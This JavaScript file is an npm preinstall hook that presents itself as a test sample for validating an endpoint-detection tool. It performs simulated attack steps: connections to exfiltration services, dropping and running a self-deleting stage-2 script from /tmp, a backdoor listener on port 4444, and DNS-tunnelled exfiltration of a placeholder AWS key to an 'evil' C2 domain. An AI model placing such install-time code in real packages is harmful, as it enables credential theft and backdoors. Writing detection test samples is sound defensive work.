/**
 * preinstall lifecycle hook — Install phase payload.
 *
 * !! TEST ARTIFACT FOR KOJUTO EDR VALIDATION !!
 * !! ALL TARGETS ARE UNREACHABLE (RFC 5737 / --network=none) !!
 * !! DO NOT PUBLISH TO npm !!
 *
 * TTPs exercised:
 *   - DNS resolution of exfil services (data_exfiltration)
 *   - Stage-2 drop + exec from /tmp (code_execution)
 *   - Backdoor bind + listen (backdoor)
 */

'use strict';

const net = require('net');
const fs = require('fs');
const { execSync } = require('child_process');
const dgram = require('dgram');

// --- DNS resolution of exfil services ---
// Even under --network=none, connect() generates ENETUNREACH syscalls
// that kojuto's connect monitor captures.

function dnsResolveExfilServices() {
  const services = [
    ['discord.com', 443],
    ['api.telegram.org', 443],
    ['pastebin.com', 443],
    ['webhook.site', 443],
    ['transfer.sh', 443],
    ['ipinfo.io', 443],
  ];

  for (const [host, port] of services) {
    try {
      const sock = new net.Socket();
      sock.setTimeout(1000);
      sock.connect(port, host, () => sock.destroy());
      sock.on('error', () => sock.destroy());
    } catch (_) {}
  }
}

// --- Stage-2 drop + exec from /tmp ---
// Two detection paths:
//   1. execve from /tmp/ (suspicious exec dir)
//   2. File write to /tmp + execution pattern

function dropStage2() {
  const stage2Path = '/tmp/.node-gyp-cache.js';
  const stage2Code = `
const net = require('net');
const os = require('os');

// Recon + exfil attempt
try {
  const sock = new net.Socket();
  sock.setTimeout(2000);
  sock.connect(443, 'discord.com', () => {
    sock.write('POST /api/webhooks/000000000000000000/FAKE HTTP/1.1\\r\\n');
    sock.destroy();
  });
  sock.on('error', () => sock.destroy());
} catch (_) {}

// Self-delete (anti-forensics)
try { require('fs').unlinkSync(__filename); } catch (_) {}
`;

  try {
    fs.writeFileSync(stage2Path, stage2Code, { mode: 0o755 });
    execSync(`node ${stage2Path}`, { timeout: 3000, stdio: 'ignore' });
  } catch (_) {}
}

// --- Backdoor listener ---
// bind(0.0.0.0:4444) + listen → triggers backdoor detection.

function backdoorListener() {
  try {
    const server = net.createServer();
    server.listen(4444, '0.0.0.0', () => {
      // Don't actually accept — just demonstrate the detection.
      server.close();
    });
    server.on('error', () => {});
  } catch (_) {}
}

// --- DNS tunneling ---
// High-entropy subdomain exfil via raw UDP DNS query.

function dnsTunnelExfil() {
  const data = Buffer.from('AKIA_STOLEN_AWS_KEY_12345').toString('base64').replace(/=/g, '');
  const domain = data.slice(0, 60) + '.x.evil-c2-server.com';

  const labels = domain.split('.');
  const parts = [];
  for (const label of labels) {
    parts.push(Buffer.from([label.length]));
    parts.push(Buffer.from(label));
  }
  parts.push(Buffer.from([0]));

  // DNS header: random ID, standard query, 1 question
  const header = Buffer.alloc(12);
  header.writeUInt16BE(0x1337, 0);
  header.writeUInt16BE(0x0100, 2);
  header.writeUInt16BE(1, 4);
  const qname = Buffer.concat(parts);
  // QTYPE=A(1), QCLASS=IN(1)
  const suffix = Buffer.alloc(4);
  suffix.writeUInt16BE(1, 0);
  suffix.writeUInt16BE(1, 2);

  const query = Buffer.concat([header, qname, suffix]);

  try {
    const sock = dgram.createSocket('udp4');
    sock.send(query, 0, query.length, 53, '8.8.8.8', () => sock.close());
  } catch (_) {}
}

// --- Execute ---
dnsResolveExfilServices();
dropStage2();
backdoorListener();
dnsTunnelExfil();
